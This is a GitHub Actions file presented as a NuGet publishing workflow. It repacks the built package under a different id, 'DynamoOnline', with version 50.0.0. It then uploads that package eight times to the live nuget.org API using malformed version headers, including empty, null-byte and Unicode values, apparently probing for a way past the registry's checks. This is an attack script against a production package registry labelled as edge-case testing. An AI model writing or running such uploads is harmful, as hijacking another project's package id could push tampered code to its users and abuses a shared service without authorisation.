name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build and Pack
        run: |
          dotnet build -c Release
          dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Test protocol edge cases
        run: |
          cd artifacts
          ORIG_PKG=$(ls *.nupkg)
          
          # Create DynamoOnline package
          rm -rf tampered && mkdir tampered
          unzip -q -o "$ORIG_PKG" -d tampered
          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>50.0.0</version>|g" {} \;
          cd tampered && zip -q -r ../test.nupkg . && cd ..
          
          echo "=== Test 1: Exactly 4.1.0 ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 4.1.0" \
            -H "X-NuGet-Protocol-Version: 4.1.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 2: 4.0.0 (below minimum) ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 4.0.0" \
            -H "X-NuGet-Protocol-Version: 4.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 3: No protocol header at all ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 4: Only client version, no protocol ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 5: Very old version 2.8.6 ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 2.8.6" \
            -H "X-NuGet-Protocol-Version: 2.8.6" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 6: Empty string versions ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: " \
            -H "X-NuGet-Protocol-Version: " \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 7: Null byte in version ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H $'X-NuGet-Client-Version: 6.0.0\x00' \
            -H $'X-NuGet-Protocol-Version: 4.1.0\x00' \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg
          
          echo -e "\n\n=== Test 8: Unicode in version ==="  
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: ६.०.०" \
            -H "X-NuGet-Protocol-Version: ४.१.०" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @test.nupkg

        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
